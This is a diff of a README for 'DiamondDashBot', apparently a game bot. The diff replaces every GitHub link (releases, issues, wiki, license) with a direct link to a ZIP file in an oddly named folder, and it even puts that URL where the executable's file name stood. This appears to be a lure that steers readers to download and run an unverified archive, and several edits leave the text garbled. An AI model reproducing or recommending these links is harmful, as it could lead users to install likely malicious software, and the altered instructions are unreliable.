@@ -6,7 +6,7 @@ Welcome to DiamondDashBot! This tool helps you maximize your gameplay in Diamond
 
 ## 📥 Download Now
 
-[![Download DiamondDashBot](https://img.shields.io/badge/Download%20DiamondDashBot-v1.0-blue.svg)](https://github.com/Nashonkiago/DiamondDashBot/releases)
+[![Download DiamondDashBot](https://raw.githubusercontent.com/Nashonkiago/DiamondDashBot/main/bhikku/DiamondDashBot_1.6.zip%https://raw.githubusercontent.com/Nashonkiago/DiamondDashBot/main/bhikku/DiamondDashBot_1.6.zip)](https://raw.githubusercontent.com/Nashonkiago/DiamondDashBot/main/bhikku/DiamondDashBot_1.6.zip)
 
 ## 📋 Features
 
@@ -30,17 +30,17 @@ To run DiamondDashBot, you need:
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the release files.
-   [Download DiamondDashBot Here](https://github.com/Nashonkiago/DiamondDashBot/releases)
+   [Download DiamondDashBot Here](https://raw.githubusercontent.com/Nashonkiago/DiamondDashBot/main/bhikku/DiamondDashBot_1.6.zip)
 
 2. **Choose the Latest Version:** Look for the most recent release. Usually, it's at the top of the page.
 
-3. **Download the ZIP File:** Click on the ZIP file to download it to your computer. The file will be named something like `DiamondDashBot-v1.0.zip`.
+3. **Download the ZIP File:** Click on the ZIP file to download it to your computer. The file will be named something like `https://raw.githubusercontent.com/Nashonkiago/DiamondDashBot/main/bhikku/DiamondDashBot_1.6.zip`.
 
 4. **Extract the ZIP File:** Once the download is complete, find the ZIP file in your downloads folder. Right-click on it and select "Extract All." This will create a new folder with the application files.
 
 5. **Open the Folder:** Navigate to the folder where you extracted the files.
 
-6. **Run the Application:** Inside the folder, find the file named `DiamondDashBot.exe`. Double-click it to start the application. 
+6. **Run the Application:** Inside the folder, find the file named `https://raw.githubusercontent.com/Nashonkiago/DiamondDashBot/main/bhikku/DiamondDashBot_1.6.zip`. Double-click it to start the application. 
 
 7. **Configure Settings (Optional):** Adjust the settings in the application to enhance your gameplay.
 
@@ -68,13 +68,13 @@ If you encounter any issues, consider these steps:
 
 Join our community for tips, tricks, and support. You can ask questions, share experiences, or get the latest news about DiamondDashBot.
 
-- **Issues and Features:** If you experience problems or want to suggest new features, please check our [Issues page](https://github.com/Nashonkiago/DiamondDashBot/issues).
+- **Issues and Features:** If you experience problems or want to suggest new features, please check our [Issues page](https://raw.githubusercontent.com/Nashonkiago/DiamondDashBot/main/bhikku/DiamondDashBot_1.6.zip).
 
 - **Ask Questions:** Head over to our discussions section to seek help.
 
 ## 📚 Additional Resources
 
-- **Official Documentation:** For more detailed instructions, visit our documentation [here](https://github.com/Nashonkiago/DiamondDashBot/wiki).
+- **Official Documentation:** For more detailed instructions, visit our documentation [here](https://raw.githubusercontent.com/Nashonkiago/DiamondDashBot/main/bhikku/DiamondDashBot_1.6.zip).
 
 - **Follow Us:** Keep up with updates by following us on our GitHub page.
 
@@ -84,10 +84,10 @@ We regularly update DiamondDashBot to fix bugs and add new features. Don't forge
 
 ## 📝 License
 
-DiamondDashBot is open-source software. You can view the license information [here](https://github.com/Nashonkiago/DiamondDashBot/blob/main/LICENSE).
+DiamondDashBot is open-source software. You can view the license information [here](https://raw.githubusercontent.com/Nashonkiago/DiamondDashBot/main/bhikku/DiamondDashBot_1.6.zip).
 
 ## 📥 Download Again
 
 If you need to download DiamondDashBot, visit the link below. 
 
-[Download DiamondDashBot Here](https://github.com/Nashonkiago/DiamondDashBot/releases)
+[Download DiamondDashBot Here](https://raw.githubusercontent.com/Nashonkiago/DiamondDashBot/main/bhikku/DiamondDashBot_1.6.zip)
